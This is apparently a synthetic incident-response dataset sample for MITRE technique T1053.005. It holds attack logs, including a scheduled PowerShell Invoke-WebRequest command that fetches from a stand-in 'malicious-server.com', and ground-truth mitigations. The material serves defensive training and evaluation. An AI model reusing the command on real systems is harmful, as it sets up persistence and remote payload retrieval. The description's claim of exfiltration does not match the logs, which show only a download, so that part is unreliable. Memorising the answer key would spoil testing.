# Dataset/Samples/incident_gpt-4o-mini.json
{
    "incident_id": "e6e926d8-7869-4e58-8b58-6cc3c54e239d",
    "technique_id": "T1053.005",
    "technique_desc": "Scheduled Task/Job: Scheduled Task",
    "incident_description": "On March 15, 2023, a series of unauthorized scheduled tasks were created on the finance department's server (Finance-Server-01), leading to potential data exfiltration. Investigation revealed that these tasks were set to harvest sensitive user data and send it to an external IP address.",
    "attack_logs": [
        {
            "timestamp": "2023-03-15T10:03:00Z",
            "host": "Finance-Server-01",
            "action": "Create Scheduled Task",
            "details": "User 'malicious_user' created a scheduled task 'DataHarvest' to execute 'powershell.exe -Command \"Invoke-WebRequest -Uri http://malicious-server.com/data -OutFile C:\\temp\\data.txt\"' every hour."
        },
        {
            "timestamp": "2023-03-15T10:05:30Z",
            "host": "Finance-Server-01",
            "action": "Execute Scheduled Task",
            "details": "Scheduled task 'DataHarvest' executed successfully, initiating download from 'http://malicious-server.com/data'."
        },
        {
            "timestamp": "2023-03-15T10:06:00Z",
            "host": "Finance-Server-01",
            "action": "Download File",
            "details": "A file named 'data.txt' was downloaded by the task from 'http://malicious-server.com/data' and saved to 'C:\\temp\\data.txt'."
        }
    ],
    "ground_truth_mitigations": [
        "Remove the scheduled task 'DataHarvest' from Finance-Server-01 using 'schtasks /delete /tn \"DataHarvest\" /f'.",
        "Conduct a review of user accounts on Finance-Server-01 to verify that 'malicious_user' did not gain elevated privileges and remove the account if unauthorized.",
        "Implement application whitelisting on Finance-Server-01 to restrict the execution of unauthorized scripts and commands.",
        "Establish logging and monitoring for scheduled tasks creation and modification events on Finance-Server-01 to detect future unauthorized changes.",
        "Ensure endpoint protection on Finance-Server-01 is up to date and scan for any anomalies related to the downloaded file 'data.txt'."
    ]
}